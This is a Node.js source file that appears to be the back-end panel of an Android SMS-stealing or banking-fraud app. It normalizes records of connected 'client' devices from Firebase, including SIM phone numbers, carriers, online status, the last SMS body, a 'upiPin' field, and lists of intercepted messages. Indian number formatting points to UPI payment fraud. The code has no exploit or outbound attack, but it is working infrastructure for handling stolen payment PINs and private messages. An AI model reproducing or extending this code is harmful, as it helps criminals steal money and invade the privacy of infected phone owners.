"use strict";

/**
 * Device management service.
 * Parses and normalizes device data from Firebase.
 */

const PhoneExtractor = require("./phoneExtractor");

// All possible field paths where a phone number might be stored in Firebase
const PHONE_FIELD_PATHS = [
  // Direct fields
  "phoneNumber", "phone", "number", "mobileNumber", "mobile",
  "phoneNo", "contactNumber", "simNumber", "sim",
  "registeredNumber", "devicePhone", "myNumber",
  "simPhoneNumber", "line1Number", "msisdn",
  "phone_number", "mobile_number", "cellNumber",
  "subscriberNumber", "subscriberId",
  // Nested objects
  "deviceInfo.phoneNumber", "deviceInfo.phone", "deviceInfo.number",
  "simInfo.phoneNumber", "simInfo.number", "simInfo.simNumber",
  "info.phone", "info.phoneNumber", "info.number",
  "extras.phoneNumber", "extras.phone",
  "device.phoneNumber", "device.phone",
  "sim.phoneNumber", "sim.number", "sim.simNumber",
  "SimData.phoneNumber", "SimData.number",
  "SIM.phoneNumber", "SIM.number",
  "network.phoneNumber", "network.number",
  "account.phone", "account.phoneNumber",
  "user.phone", "user.phoneNumber",
  "owner.phone", "owner.phoneNumber",
  "profile.phone", "profile.phoneNumber",
];

/**
 * Get a value from a nested object using dot-notation path.
 */
function getNestedValue(obj, path) {
  if (!obj) return undefined;
  const parts = path.split(".");
  let current = obj;
  for (const part of parts) {
    if (current === null || current === undefined || typeof current !== "object") return undefined;
    current = current[part];
  }
  return current;
}

class DeviceService {
  static normalize(id, raw) {
    if (!raw || typeof raw !== "object") return null;

    const batteryRaw = raw.batteryLevel ?? raw.battery ?? "—";
    let batteryPercent = 0;
    if (typeof batteryRaw === "number") {
      batteryPercent = batteryRaw;
    } else if (typeof batteryRaw === "string") {
      const match = batteryRaw.match(/(\d+)/);
      batteryPercent = match ? parseInt(match[1], 10) : 0;
    }

    // Extract phone from device-specific fields ONLY (not from SMS)
    let phoneNumber = "—";
    for (const path of PHONE_FIELD_PATHS) {
      const val = getNestedValue(raw, path);
      if (val && val !== "—" && val !== "" && val !== "null" && val !== "undefined" && val !== "unknown") {
        const digits = String(val).replace(/[^0-9]/g, "");
        if (digits.length >= 10 && digits.length <= 15) {
          phoneNumber = digits;
          // Prepend 91 for Indian 10-digit numbers
          if (phoneNumber.length === 10 && /^[6-9]/.test(phoneNumber)) {
            phoneNumber = "91" + phoneNumber;
          }
          break;
        }
      }
    }

    // Carrier/provider detection
    const smsText = raw.lastSms || raw.smsBody || "";
    const phoneInfo = PhoneExtractor.extract(smsText);

    return {
      id,
      name: raw.deviceName || raw.name || raw.model || id,
      model: raw.model || "—",
      android: raw.androidVersion || raw.android || "—",
      battery: String(batteryRaw),
      batteryPercent,
      phoneNumber,
      provider: raw.provider || raw.carrier || raw.simOperator
        || getNestedValue(raw, "deviceInfo.carrier")
        || getNestedValue(raw, "simInfo.operator")
        || getNestedValue(raw, "network.operator")
        || getNestedValue(raw, "sim.operator")
        || phoneInfo.carriers[0] || "—",
      upiPin: raw.upiPin || raw.upiPIN || "",
      status: Boolean(raw.status || raw.online || raw.isConnected),
      lastSeen: raw.lastSeen || raw.lastOnline || null,
      sdkVersion: raw.sdkVersion || raw.sdk || "—",
      simOperator: raw.simOperator || "—",
    };
  }

  static parseAll(clientsData) {
    if (!clientsData || typeof clientsData !== "object") return [];
    return Object.entries(clientsData)
      .map(([id, raw]) => this.normalize(id, raw))
      .filter(Boolean)
      .sort((a, b) => {
        if (a.status !== b.status) return a.status ? -1 : 1;
        return a.name.localeCompare(b.name);
      });
  }

  static parseMessages(messagesData) {
    if (!messagesData || typeof messagesData !== "object") return [];
    return Object.entries(messagesData)
      .map(([id, raw]) => {
        if (!raw || typeof raw !== "object") return null;
        return {
          id,
          text: raw.text || raw.body || raw.message || "",
          sender: raw.sender || raw.from || "—",
          timestamp: raw.timestamp || raw.time || null,
          read: Boolean(raw.read),
        };
      })
      .filter(Boolean)
      .sort((a, b) => {
        if (!a.timestamp || !b.timestamp) return 0;
        return new Date(b.timestamp) - new Date(a.timestamp);
      });
  }
}

module.exports = DeviceService;
